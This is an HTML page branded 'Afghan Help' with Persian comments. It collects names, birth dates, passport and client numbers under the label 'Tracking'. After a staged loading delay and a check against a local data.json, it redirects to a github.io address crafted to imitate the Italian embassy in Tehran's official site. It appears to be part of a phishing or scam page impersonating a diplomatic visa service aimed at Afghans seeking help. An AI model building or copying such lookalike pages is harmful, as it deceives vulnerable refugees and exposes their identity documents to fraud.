<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Afghan Help</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    header {
      background-color: #004466;
      color: white;
      padding: 15px;
      text-align: center;
    }

    header img {
      width: 100px; /* بزرگ‌تر کردن لوگو */
      vertical-align: middle;
    }

    header span {
      font-size: 24px;
      font-weight: bold;
      margin-left: 10px;
      vertical-align: middle;
    }

    main {
      flex: 1;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    form {
      max-width: 400px;
      width: 100%;
    }

    input, button {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      box-sizing: border-box;
      font-size: 16px;
    }

    button {
      background-color: #004466;
      color: white;
      border: none;
      cursor: pointer;
    }

    button:hover {
      background-color: #006699;
    }

    #error {
      color: red;
      display: none;
    }

    #loadingScreen {
      display: none;
      text-align: center;
      margin-top: 20px;
    }

    #loadingScreen img {
      width: 50px;
      height: 50px;
    }

    footer {
      background-color: #f1f1f1;
      padding: 10px;
      text-align: center;
    }

    .social a {
      margin: 0 10px;
      text-decoration: none;
      color: #004466;
      font-weight: bold;
    }

    @media (max-width: 600px) {
      header span {
        display: block;
        margin-top: 10px;
      }
    }
  </style>
</head>
<body>

  <header>
    <img src="logo.png" alt="Logo" />
    <span>Afghan Help</span>
  </header>

  <main>
    <form id="verifyForm">
      <input type="text" id="name" placeholder="Name" required />
      <input type="text" id="lastname" placeholder="Last Name" required />
      <input type="date" id="dob" placeholder="Date of Birth" required />
      <input type="text" id="passport" placeholder="Passport No (Optional)" />
      <input type="text" id="clientno" placeholder="Client No" required />
      <button type="submit">Tracking</button>
      <p id="error">Incorrect information entered!</p>
    </form>
    <div id="loadingScreen">
      <img src="loading.gif" alt="Loading...">
    </div>
  </main>

  <footer>
    <div class="social">
      <a href="https://instagram.com" target="_blank">Instagram</a>
      <a href="https://youtube.com" target="_blank">YouTube</a>
      <a href="https://x.com" target="_blank">X</a>
    </div>
  </footer>

  <script>
    document.getElementById('verifyForm').addEventListener('submit', function (e) {
      e.preventDefault();
      document.getElementById('error').style.display = 'none';
      document.getElementById('loadingScreen').style.display = 'block';

      // تأخیر ۳ ثانیه قبل از بررسی داده‌ها
      setTimeout(() => {
        fetch('data.json')
          .then(response => response.json())
          .then(data => {
            const name = document.getElementById('name').value.trim();
            const lastname = document.getElementById('lastname').value.trim();
            const dob = document.getElementById('dob').value.trim();
            const clientno = document.getElementById('clientno').value.trim();

            document.getElementById('loadingScreen').style.display = 'none';

            if (
              name === data.name &&
              lastname === data.lastname &&
              dob === data.dob &&
              clientno === data.clientno
            ) {
              window.location.href = 'https://ambteheran.github.io/https-ambteheran.esteri.it-it-/';
            } else {
              document.getElementById('error').style.display = 'block';
            }
          })
          .catch(err => {
            document.getElementById('loadingScreen').style.display = 'none';
            console.error('Error loading data.json:', err);
          });
      }, 3000); // ۳۰۰۰ میلی‌ثانیه = ۳ ثانیه
    });
  </script>

</body>
</html>
